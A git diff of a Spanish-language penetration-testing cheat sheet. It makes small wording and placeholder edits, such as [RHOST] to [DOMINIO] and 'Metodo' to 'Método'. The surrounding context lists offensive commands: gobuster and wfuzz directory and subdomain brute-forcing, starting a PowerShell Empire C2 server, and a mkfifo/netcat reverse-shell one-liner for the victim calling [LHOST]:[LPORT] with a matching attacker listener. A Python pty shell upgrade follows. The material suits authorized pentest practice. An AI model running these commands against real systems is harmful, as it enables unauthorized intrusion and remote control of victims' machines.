@@ -17,7 +17,7 @@ dnsrecon -d [WEB] > ver registros DNS
 
 ### SCAN WEB
 **Escaneo de directorios**
-	gobuster dir -u [RHOST]-w /usr/share/dirb/wordlists/[WORDLIST] --no-error -t 200
+	gobuster dir -u [DOMINIO]-w /usr/share/dirb/wordlists/[WORDLIST] --no-error -t 200
 **Escaneo de subdominios**
 	gobuster dns -d [DOMINIO] -w /usr/share/dnsrecon/[WORDLIST] -t 200 --no-error
 	wfuzz -w /usr/share/dnsrecon/[WORDLIST] -u [DOMINIO] -H 'Host: FUZZ.[DOMINIO]' -t 50 --hc 302 
@@ -32,12 +32,12 @@ powershell-empire server > inicia el servidor de empire
 powershell-empire client > inicia el cliente
 
 ### ESTABILIZAR SHELL
-**Metodo 1**
+**Método 1**
 	**Victima**
 		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh  -i 2>&1|nc [LHOST] \[LPORT] >/tmp/f
 	**Atacante**
 		nc -nvlp [LPORT]
-**Metodo 2 (Python)**
+**Método 2 (Python)**
 	python3 -c 'import pty;pty.spawn("/bin/bash")'
 	_Ctrl+Z_
 	stty raw -echo; fg
